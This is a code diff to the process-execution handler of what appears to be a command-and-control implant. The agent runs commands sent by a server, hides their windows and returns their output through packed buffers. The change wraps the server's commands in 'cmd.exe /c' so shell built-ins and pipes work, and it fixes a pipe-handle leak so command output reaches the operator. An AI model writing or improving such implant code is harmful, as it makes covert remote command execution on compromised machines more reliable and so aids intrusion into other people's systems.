@@ -772,10 +772,25 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		spi.hStdInput  = NULL;
 	}
 
-	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+	// Fix: Wrap command in "cmd.exe /c" to support built-ins (dir, del) and pipes (|)
+	// CreateProcess cannot handle "dir" or "|" directly.
+	CHAR* finalCmd = progArgs;
+	CHAR cmdBuffer[2048];
+	if (progArgsSize > 0 && progArgsSize < 2000) {
+		// simple check to avoid double wrapping if server already sent cmd.exe
+		if (StrNCmpA(progArgs, "cmd.exe", 7) != 0 && StrNCmpA(progArgs, "cmd ", 4) != 0) {
+			_snprintf(cmdBuffer, sizeof(cmdBuffer), "cmd.exe /c %s", progArgs);
+			finalCmd = cmdBuffer;
+		}
+	}
+
+	BOOL result = ApiWin->CreateProcessA(NULL, finalCmd, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
 
 	if (result) {
-		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
+		// Fix: Pass NULL for pipeWrite to JobData because we close our handle here.
+		// The child process holds the write handle now. If we keep it open,
+		// the pipe never closes (EOF) even after child exits.
+		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, NULL);
 
 		outPacker->Pack32(taskId);
 		outPacker->Pack32(commandId);
@@ -785,6 +800,13 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 		ApiNt->NtClose(pi.hThread);
 		pi.hThread = NULL;
+		
+		// Close the write end of the pipe in the parent process
+		if (pipeWrite) {
+			ApiNt->NtClose(pipeWrite);
+			pipeWrite = NULL;
+		}
+
 		if (!progOutput) {
 			ApiNt->NtClose(pi.hProcess);
 			pi.hProcess = NULL;
